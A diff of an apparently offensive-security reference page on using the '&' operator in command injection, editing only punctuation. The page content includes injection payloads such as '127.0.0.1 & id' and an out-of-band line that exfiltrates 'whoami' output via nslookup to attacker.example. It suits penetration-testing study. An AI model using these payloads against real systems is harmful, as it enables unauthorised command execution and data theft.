@@ -1,6 +1,6 @@
 ---
 title: "Background execution with the ampersand operator"
-description: "Using & to detach an injected command so it runs asynchronously, keeping the response fast while a payload executes—and the Windows cmd.exe meaning of & as a separator."
+description: "Using & to detach an injected command so it runs asynchronously, keeping the response fast while a payload executes, and the Windows cmd.exe meaning of & as a separator."
 keywords:
   - command injection
   - background execution
@@ -24,7 +24,7 @@ In `sh`/`bash`, `cmd &` forks `cmd` into the background and the shell proceeds. 
 127.0.0.1 & id
 ```
 
-The shell backgrounds the (intended) command and runs `id`; control returns without blocking on the first job. Because the parent process need not wait, the application's response is not held open by your payload—useful when a synchronous command would time out the request or stall the worker.
+The shell backgrounds the (intended) command and runs `id`; control returns without blocking on the first job. Because the parent process need not wait, the application's response is not held open by your payload, useful when a synchronous command would time out the request or stall the worker.
 
 ## Asynchronous payloads
 
@@ -44,7 +44,7 @@ Fully detaching from the controlling terminal and streams keeps the job alive af
 
 ## Timing and confirmation
 
-A backgrounded job does not delay the response, so `&` is poor for a time-based oracle on its own—use `;` or `&&` with `sleep` when you want the delay to be *observable*. Conversely, `&` is ideal when you want execution **without** changing response time, confirming instead through an out-of-band callback:
+A backgrounded job does not delay the response, so `&` is poor for a time-based oracle on its own, use `;` or `&&` with `sleep` when you want the delay to be *observable*. Conversely, `&` is ideal when you want execution **without** changing response time, confirming instead through an out-of-band callback:
 
 ```
 127.0.0.1 & nslookup $(whoami).OOB_ID.attacker.example &
@@ -61,7 +61,7 @@ The ampersand is parsed as a control operator only outside quotes; break out fir
 
 ## Windows: `&` is a separator
 
-On Windows `cmd.exe` the ampersand does **not** background—it is the unconditional **command separator** (the `cmd` analogue of POSIX `;`):
+On Windows `cmd.exe` the ampersand does **not** background, it is the unconditional **command separator** (the `cmd` analogue of POSIX `;`):
 
 ```
 127.0.0.1 & whoami            # runs whoami after ping, sequentially
